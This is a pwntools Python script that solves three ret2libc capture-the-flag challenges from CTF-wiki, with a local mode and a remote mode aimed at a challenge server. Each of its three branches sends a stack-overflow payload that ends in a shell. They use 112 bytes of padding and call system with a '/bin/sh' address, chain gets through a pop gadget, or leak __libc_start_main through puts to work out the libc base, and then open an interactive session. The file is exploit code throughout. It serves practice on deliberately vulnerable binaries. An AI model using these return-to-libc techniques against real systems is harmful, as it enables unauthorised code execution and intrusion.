from pwn import *
import misc.utils
from misc import utils

local = 1
file_num = 3

if __name__ == "__main__":
    addr = '../../challenges/ctfwiki/ret2libc' + str(file_num)
    ip = '111.200.241.244:65037'
    r = None
    if not local:
        r = remote(ip.split(':')[0], int(ip.split(':')[1]))
    else:
        r = process([addr])

    if file_num == 1:
        binsh = 0x08048720
        system_addr = 0x8048460
        payload = flat(112 * b'A', system_addr, b'b' * 4, binsh)  # 'push ebp' is implemented in system function

        r.sendline(payload)
        r.interactive()

    elif file_num == 2:
        buf2_addr = 0x804a080
        gets_addr = 0x8048460
        system_addr = 0x8048490
        pop_ebx_ret = 0x0804843d

        payload = flat(112 * b'A', gets_addr, pop_ebx_ret, buf2_addr, system_addr, 0xdeadbeef, buf2_addr)
        """
        input '/bin/sh' when calling <gets>
        """

        r.sendline(payload)
        r.interactive()

    elif file_num == 3:
        ret2libc3 = ELF(addr)
        puts_plt = ret2libc3.plt['puts']
        puts_got = ret2libc3.got['puts']
        libc_start_main_got = ret2libc3.got['__libc_start_main']

        main = ret2libc3.symbols['_start']

        payload = flat([b'A' * 112, puts_plt, main, libc_start_main_got])

        r.sendlineafter('Can you find it !?', payload)
        libc_start_main_addr = u32(r.recv()[0:4])
        # libc6_2.31-0ubuntu9.7_i386
        libcbase = libc_start_main_addr - 0x1adf0
        system_addr = libcbase + 0x41790
        binsh_addr = libcbase + 0x18e363

        # _start -> 112, main -> 104, stack alignment
        payload = flat([b'A' * 112, system_addr, 0xdeadbeef, binsh_addr])

        r.sendline(payload)

        r.interactive()
